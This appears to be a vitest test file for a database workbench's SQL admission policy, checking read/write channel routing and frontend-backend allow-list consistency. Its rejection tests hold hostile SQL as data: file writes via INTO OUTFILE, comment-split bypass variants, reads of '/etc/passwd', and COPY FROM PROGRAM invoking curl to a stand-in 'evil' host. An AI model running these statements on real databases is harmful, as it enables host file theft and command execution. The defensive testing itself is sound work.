import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import {
  READ_STATEMENT_HEADS,
  CONNECTION_SCOPED_HEADS,
  TRANSACTION_CONTROL_HEADS,
  WRITE_STATEMENT_HEADS,
  classifySqlStatement,
  normalizeReadOnlyStatement,
  stripSqlComments,
  normalizeWriteStatement,
} from '../../src/services/sql-statement-policy.js';
import { expectGuardRedOnMutation, mutate } from '../helpers/guard-mutation.js';

const CDS_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');

describe('工作台 SQL 准入：该放的都放行', () => {
  it('DDL / DML / 账号维护 / 维护动作全部走得通写通道', () => {
    const statements = [
      'CREATE TABLE demo (id INT PRIMARY KEY, name VARCHAR(64))',
      'ALTER TABLE demo ADD COLUMN age INT',
      'CREATE INDEX idx_demo_name ON demo (name)',
      'RENAME TABLE demo TO demo2',
      'DROP TABLE demo2',
      'TRUNCATE TABLE demo',
      "INSERT INTO demo (id, name) VALUES (1, 'a')",
      "UPDATE demo SET name = 'b' WHERE id = 1",
      'DELETE FROM demo WHERE id = 1',
      "GRANT SELECT ON app.* TO 'someone'@'%'",
      "ALTER USER 'someone'@'%' IDENTIFIED BY 'x'",
      'ANALYZE TABLE demo',
      'OPTIMIZE TABLE demo',
      'CALL some_proc(1)',
      'WITH removed AS (DELETE FROM demo WHERE id = 1 RETURNING *) SELECT * FROM removed',
    ];
    for (const sql of statements) {
      expect(() => normalizeWriteStatement(sql), `写通道应放行：${sql}`).not.toThrow();
    }
  });

  it('CTE / TABLE / VALUES 这类读语句走读通道（此前两条路都不收）', () => {
    for (const sql of [
      'WITH recent AS (SELECT * FROM demo LIMIT 10) SELECT COUNT(*) FROM recent',
      'TABLE demo',
      'VALUES (1), (2)',
      'SELECT * FROM demo',
      'SHOW FULL TABLES',
      'DESCRIBE demo',
      'EXPLAIN SELECT * FROM demo',
    ]) {
      expect(() => normalizeReadOnlyStatement(sql), `读通道应放行：${sql}`).not.toThrow();
    }
  });

  /**
   * 改数据的 CTE 此前两条路都不收：语句头是 with 被判成读，读通道又因含 DELETE 拒收，
   * 写通道再以「这是只读语句」拒收（Codex P2）。
   */
  it('改数据的 CTE 判为写，读通道拒、写通道收', () => {
    const sql = 'WITH removed AS (DELETE FROM demo WHERE id = 1 RETURNING *) SELECT * FROM removed';
    expect(classifySqlStatement(sql).kind).toBe('write');
    expect(() => normalizeWriteStatement(sql)).not.toThrow();
    expect(() => normalizeReadOnlyStatement(sql)).toThrow(/写操作|写 SQL/);
  });

  /**
   * 事务控制两条路都不收：每次执行是独立连接，BEGIN / UPDATE / ROLLBACK 三条全「成功」
   * 而数据回不去，等于给了一个假的安全信号（Codex P1）。
   */
  it('事务控制语句被拒绝，并指向初始化 SQL', () => {
    for (const sql of ['BEGIN', 'START TRANSACTION', 'COMMIT', 'ROLLBACK', 'SAVEPOINT s1']) {
      expect(() => normalizeWriteStatement(sql), `写通道应拒绝：${sql}`).toThrow(/初始化 SQL/);
      expect(() => normalizeReadOnlyStatement(sql), `读通道应拒绝：${sql}`).toThrow(/初始化 SQL/);
    }
    expect(TRANSACTION_CONTROL_HEADS).toContain('begin');
    for (const head of TRANSACTION_CONTROL_HEADS) {
      expect(WRITE_STATEMENT_HEADS, `${head} 不该再出现在写白名单里`).not.toContain(head);
    }
  });

  /**
   * 连接作用域语句和事务控制同理：设置/选中的库/表锁随进程退出消失，下一条语句拿不到，
   * 可这一条还报「成功」（Codex P1，第二轮）。
   */
  it('连接作用域语句被拒绝，并指向初始化 SQL', () => {
    for (const sql of ['SET SESSION sql_mode = ""', 'USE other_db', 'LOCK TABLES demo WRITE', 'UNLOCK TABLES', 'RESET QUERY CACHE']) {
      expect(() => normalizeWriteStatement(sql), `写通道应拒绝：${sql}`).toThrow(/初始化 SQL/);
      expect(() => normalizeReadOnlyStatement(sql), `读通道应拒绝：${sql}`).toThrow(/初始化 SQL/);
    }
    for (const head of CONNECTION_SCOPED_HEADS) {
      expect(WRITE_STATEMENT_HEADS, `${head} 不该再出现在写白名单里`).not.toContain(head);
    }
  });

  it('读写分类与两端白名单一致', () => {
    expect(classifySqlStatement('with x as (select 1) select * from x').kind).toBe('read');
    expect(classifySqlStatement('DELETE FROM demo').kind).toBe('write');
    expect(classifySqlStatement('燒 what').kind).toBe('unknown');
    expect(READ_STATEMENT_HEADS).toContain('with');
    expect(WRITE_STATEMENT_HEADS).toContain('delete');
    // 同一个语句头不能同时在两张表里，否则前后端分流会打架
    for (const head of READ_STATEMENT_HEADS) expect(WRITE_STATEMENT_HEADS).not.toContain(head);
  });
});

describe('工作台 SQL 准入：该拦的仍拦', () => {
  it('披着读皮的写不许走读通道', () => {
    expect(() => normalizeReadOnlyStatement('WITH x AS (SELECT 1) DELETE FROM demo')).toThrow(/写入关键字|写 SQL/);
    expect(() => normalizeReadOnlyStatement('SELECT * FROM demo FOR UPDATE')).toThrow();
    expect(() => normalizeReadOnlyStatement('DROP TABLE demo')).toThrow();
  });

  it('只读语句不许从写通道绕过读通道的检查', () => {
    expect(() => normalizeWriteStatement('SELECT * FROM demo')).toThrow(/只读通道/);
  });

  /**
   * 注释能把词组拆开：`INTO/**\/OUTFILE` 匹配不上 `into\s+outfile`，而它的语句头是
   * SELECT，会一路走读通道写出文件——绕过 data-write 权限与二次确认（Codex P1，第二轮）。
   * 所以危险标记降到**词级别**：SQL 不允许在标识符中间插注释，`outfile` 这个词拆不开。
   */
  it('注释拆词组也拦得住', () => {
    // 词级别标记（outfile / dumpfile）注释拆不开，直接命中宿主逃逸判据
    for (const sql of [
      "SELECT 1 INTO/**/OUTFILE '/tmp/x'",
      "SELECT 1 INTO -- c\nOUTFILE '/tmp/x'",
      "SELECT 1 INTO/*x*/DUMPFILE '/tmp/x'",
    ]) {
      expect(() => normalizeReadOnlyStatement(sql), `读通道应以宿主逃逸拒绝：${sql}`).toThrow(/宿主文件/);
      expect(() => normalizeWriteStatement(sql), `写通道也应拒绝：${sql}`).toThrow();
    }
    // 词组标记（LOAD DATA）靠剥注释后匹配；读通道另有语句头闸先拦，两条路都进不去
    const loadData = "LOAD/**/DATA INFILE '/etc/passwd' INTO TABLE demo";
    expect(stripSqlComments(loadData)).toContain('LOAD DATA');
    expect(() => normalizeReadOnlyStatement(loadData)).toThrow();
    expect(() => normalizeWriteStatement(loadData)).toThrow();
  });

  it('读写宿主文件 / 调外部进程一律拒绝', () => {
    for (const sql of [
      "SELECT * FROM demo INTO OUTFILE '/tmp/x'",
      "SELECT LOAD_FILE('/etc/passwd')",
      "LOAD DATA INFILE '/etc/passwd' INTO TABLE demo",
      "COPY demo FROM PROGRAM 'curl http://evil'",
      "SELECT pg_read_file('/etc/passwd')",
    ]) {
      expect(() => {
        try {
          normalizeReadOnlyStatement(sql);
        } catch {
          normalizeWriteStatement(sql);
        }
      }, `应拒绝：${sql}`).toThrow();
    }
  });

  it('多语句被拒绝，并指向初始化 SQL 输入框', () => {
    expect(() => normalizeReadOnlyStatement('SELECT 1; SELECT 2')).toThrow(/初始化 SQL/);
    expect(() => normalizeWriteStatement('DELETE FROM a; DELETE FROM b')).toThrow(/初始化 SQL/);
  });

  it('空 / 超长被拒绝', () => {
    expect(() => normalizeReadOnlyStatement('   ')).toThrow(/不能为空/);
    expect(() => normalizeWriteStatement(`INSERT INTO demo VALUES ('${'x'.repeat(20_001)}')`)).toThrow(/过长/);
  });
});

describe('前后端判据不许漂移', () => {
  function frontendHeads(): string[] {
    const source = fs.readFileSync(path.join(CDS_ROOT, 'web/src/components/BranchDetailDrawer.tsx'), 'utf8');
    const literal = source.match(/const READ_STATEMENT_HEADS = \[(.*?)\];/s)?.[1];
    expect(literal, '前端 READ_STATEMENT_HEADS 找不到了').toBeTruthy();
    return (literal || '').split(',').map((s) => s.trim().replace(/^['"]|['"]$/g, '')).filter(Boolean);
  }

  it('前端只读白名单与后端逐字一致', () => {
    expect(frontendHeads()).toEqual([...READ_STATEMENT_HEADS]);
  });

  it('后端两个入口都走这份策略，没有第二份判据', () => {
    const source = fs.readFileSync(path.join(CDS_ROOT, 'src/routes/branches.ts'), 'utf8');
    expect(source).toContain('return normalizeReadOnlyStatement(sql);');
    expect(source).toContain('return normalizeWriteStatement(sql);');
    expect(source, '路由里不应再自己维护一份语句头白名单')
      .not.toContain("['select', 'show', 'describe', 'desc', 'explain'].includes(head)");
  });

  it('红用例：前端白名单漂一个词，守卫必须变红', () => {
    const realFront = fs.readFileSync(path.join(CDS_ROOT, 'web/src/components/BranchDetailDrawer.tsx'), 'utf8');
    const guard = (source: string) => {
      const literal = source.match(/const READ_STATEMENT_HEADS = \[(.*?)\];/s)?.[1] || '';
      const heads = literal.split(',').map((s) => s.trim().replace(/^['"]|['"]$/g, '')).filter(Boolean);
      expect(heads).toEqual([...READ_STATEMENT_HEADS]);
    };
    expectGuardRedOnMutation(guard, realFront, mutate(realFront, "'with', 'table', 'values'", "'table', 'values'"));
  });
});
